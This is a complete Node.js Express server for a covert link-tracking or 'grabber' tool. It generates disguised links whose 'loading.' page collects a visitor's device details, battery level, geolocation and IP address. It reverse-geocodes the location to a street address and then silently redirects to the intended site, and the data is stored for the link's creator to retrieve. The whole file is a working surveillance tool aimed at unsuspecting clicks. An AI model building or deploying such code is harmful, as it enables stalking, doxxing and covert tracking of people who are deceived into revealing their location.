const express = require('express');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();

// In-memory storage for tracking data
const trackingData = new Map();

// Clean up old tracking data periodically (every 24 hours)
const CLEANUP_INTERVAL = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
const DATA_RETENTION_TIME = 24 * 60 * 60 * 1000; // Keep data for 24 hours

setInterval(() => {
    const now = Date.now();
    for (const [id, data] of trackingData.entries()) {
        if (now - data.createdAt > DATA_RETENTION_TIME) {
            trackingData.delete(id);
            console.log(`Cleaned up tracking data for ID: ${id}`);
        }
    }
}, CLEANUP_INTERVAL);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/generate', (req, res) => {
    const id = uuidv4();
    const targetUrl = req.body.target_url;
    
    // Store tracking data in memory
    trackingData.set(id, {
        id,
        targetUrl,
        clicks: [],
        createdAt: Date.now()
    });

    const trackingUrl = `${req.protocol}://${req.get('host')}/track/${id}`;
    res.json({ trackingUrl });
});

app.get('/track/:id', (req, res) => {
    const { id } = req.params;
    const tracking = trackingData.get(id);

    if (tracking) {
        const script = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>loading.</title>
            </head>
            <body>
                <script>
                    // Function to send the collected data to the server
                    function sendDeviceInfo(battery, latitude, longitude) {
                        const deviceInfo = {
                            userAgent: navigator.userAgent,
                            screenWidth: window.screen.width,
                            screenHeight: window.screen.height,
                            batteryLevel: battery ? battery.level * 100 : null,
                            latitude: latitude,
                            longitude: longitude,
                            timestamp: new Date().toISOString()
                        };

                        fetch('/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                pageID: '${id}',
                                deviceInfo: deviceInfo
                            }),
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Device info sent:', data);
                            window.location.href = '${tracking.targetUrl}';
                        })
                        .catch(error => {
                            console.error('Error sending device info:', error);
                            window.location.href = '${tracking.targetUrl}';
                        });
                    }

                    // Get battery info
                    navigator.getBattery().then(battery => {
                        // Get location info
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                sendDeviceInfo(battery, position.coords.latitude, position.coords.longitude);
                            },
                            error => {
                                console.error('Error getting location:', error);
                                sendDeviceInfo(battery, null, null);
                            }
                        );
                    }).catch(() => {
                        console.error('Error getting battery info');
                        // Try to get location without battery info
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                sendDeviceInfo(null, position.coords.latitude, position.coords.longitude);
                            },
                            error => {
                                console.error('Error getting location:', error);
                                sendDeviceInfo(null, null, null);
                            }
                        );
                    });
                </script>
            </body>
            </html>
        `;

        res.send(script);
    } else {
        res.status(404).send('Invalid tracking URL or link has expired');
    }
});

app.post('/location', async (req, res) => {
    const { pageID, deviceInfo } = req.body;
    const tracking = trackingData.get(pageID);

    if (tracking) {
        const clickData = {
            ...deviceInfo,
            ip: req.headers['x-forwarded-for'] || req.ip || req.connection?.remoteAddress || req.socket?.remoteAddress,
            timestamp: new Date()
        };

        // Convert latitude and longitude to address if available
        if (deviceInfo.latitude && deviceInfo.longitude) {
            try {
                const url = `https://nominatim.openstreetmap.org/reverse?lat=${deviceInfo.latitude}&lon=${deviceInfo.longitude}&format=json`;

                const response = await fetch(url, {
                    headers: {
                        'User-Agent': 'TrackerApp/1.0 (ai4humankind@gmail.com)' //If you are cloning this repo, please use your own email id here.
                    }
                });

                const data = await response.json();

                if (data && data.display_name) {
                    clickData.address = data.display_name;
                    console.log('Address:', clickData.address);
                }
            } catch (error) {
                console.error('Error getting address:', error);
            }
        }

        tracking.clicks.push(clickData);
        console.log(`Tracking details for page ${pageID}:`, tracking.clicks);
    }

    res.status(200).json({ success: true });
});


// GET route to retrieve tracking data
app.get('/get-tracking/:pageID', (req, res) => {
    const { pageID } = req.params;
    const tracking = trackingData.get(pageID);

    if (tracking) {
        res.json({ clicks: tracking.clicks });
    } else {
        res.status(404).json({ message: 'Tracking data not found or expired' });
    }
});

app.get('/stats/:id', (req, res) => {
    const { id } = req.params;
    const tracking = trackingData.get(id);

    if (tracking) {
        res.json(tracking.clicks);
    } else {
        res.status(404).send('Invalid tracking ID or data expired');
    }
});

// Route to manually delete tracking data
app.delete('/delete/:id', (req, res) => {
    const { id } = req.params;
    if (trackingData.has(id)) {
        trackingData.delete(id);
        res.json({ message: 'Tracking data deleted successfully' });
    } else {
        res.status(404).json({ message: 'Tracking ID not found' });
    }
});

// Route to get server status and active tracking count
app.get('/status', (req, res) => {
    res.json({
        status: 'running',
        activeTracking: trackingData.size,
        uptime: process.uptime()
    });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log('Using in-memory storage - data will be lost on server restart');
});
